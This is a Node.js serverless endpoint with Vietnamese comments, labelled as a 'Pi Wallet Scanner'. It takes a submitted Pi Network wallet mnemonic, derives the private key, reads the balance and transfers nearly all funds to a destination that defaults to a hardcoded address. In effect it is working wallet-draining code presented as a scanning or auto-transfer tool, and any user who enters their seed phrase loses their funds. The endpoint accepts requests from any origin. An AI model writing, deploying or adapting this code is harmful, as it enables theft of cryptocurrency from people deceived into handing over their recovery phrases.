const StellarSdk = require('stellar-sdk');
const bip39 = require('bip39');
const HDKey = require('hdkey');
const fetch = require('node-fetch');

// Cấu hình
const PI_API_URL = "https://api.mainnet.minepi.com";
const HORIZON_URL = "https://api.mainnet.minepi.com";
const NETWORK_PASSPHRASE = "Pi Network";
const DEFAULT_DESTINATION = "GA6HYCTPYDQGPM4US3H5KIZGHWG2IP3SXX3WXX7ERKHZYKK4KZMUTLFI";
const DEFAULT_MIN_BALANCE = 0.05;

// Tạo keypair từ mnemonic
async function getKeyPairFromMnemonic(mnemonic) {
    const seed = await bip39.mnemonicToSeed(mnemonic);
    const derivationPath = "m/44'/314159'/0'";
    const hdkey = HDKey.fromMasterSeed(seed);
    const childKey = hdkey.derive(derivationPath);
    const privateKey = childKey.privateKey;
    return StellarSdk.Keypair.fromRawEd25519Seed(privateKey);
}

// Kiểm tra số dư tài khoản
async function checkAccountBalance(publicKey) {
    const response = await fetch(`${PI_API_URL}/accounts/${publicKey}`);
    
    if (response.status === 404) {
        return 0;
    }
    
    if (!response.ok) {
        throw new Error(`Lỗi API: ${response.status}`);
    }
    
    const data = await response.json();
    
    let balance = 0;
    for (const balanceInfo of data.balances) {
        if (balanceInfo.asset_type === "native") {
            balance = parseFloat(balanceInfo.balance);
            break;
        }
    }
    
    return balance;
}

// Gửi Pi
async function sendPi(keypair, destination, amount) {
    const server = new StellarSdk.Server(HORIZON_URL);
    const account = await server.loadAccount(keypair.publicKey());
    
    const transaction = new StellarSdk.TransactionBuilder(account, {
        fee: "100000", // 0.01 Pi
        networkPassphrase: NETWORK_PASSPHRASE
    })
    .addOperation(StellarSdk.Operation.payment({
        destination: destination,
        asset: StellarSdk.Asset.native(),
        amount: amount.toFixed(7)
    }))
    .addMemo(StellarSdk.Memo.text("Pi Wallet Scanner - Tu Dong Chuyen"))
    .setTimeout(30)
    .build();
    
    transaction.sign(keypair);
    return await server.submitTransaction(transaction);
}

module.exports = async (req, res) => {
    // Cấu hình CORS
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Chỉ chấp nhận phương thức POST' });
    }

    try {
        const { mnemonic, destination, minBalance } = req.body;
        const useDestination = destination || DEFAULT_DESTINATION;
        const useMinBalance = parseFloat(minBalance) || DEFAULT_MIN_BALANCE;
        
        if (!mnemonic) {
            return res.status(400).json({ error: 'Thiếu mnemonic' });
        }
        
        const keypair = await getKeyPairFromMnemonic(mnemonic);
        const publicKey = keypair.publicKey();
        const balance = await checkAccountBalance(publicKey);
        
        const txFee = 0.01;
        const availableToSend = balance - useMinBalance - txFee;
        
        if (availableToSend <= 0) {
            return res.status(400).json({ 
                error: `Số dư không đủ để gửi. Cần có hơn ${useMinBalance + txFee} Pi.`,
                publicKey,
                balance
            });
        }
        
        const result = await sendPi(keypair, useDestination, availableToSend);
        
        res.status(200).json({
            success: true,
            publicKey,
            sentAmount: availableToSend,
            destination: useDestination,
            remainingBalance: useMinBalance,
            transactionHash: result.hash
        });
        
    } catch (error) {
        let errorMessage = error.message;
        
        // Phân tích lỗi từ Horizon API nếu có
        if (error.response && error.response.data) {
            try {
                const extraInfo = JSON.stringify(error.response.data);
                errorMessage += ` - ${extraInfo}`;
            } catch (e) {
                // Bỏ qua lỗi
            }
        }
        
        res.status(500).json({ error: errorMessage });
    }
};
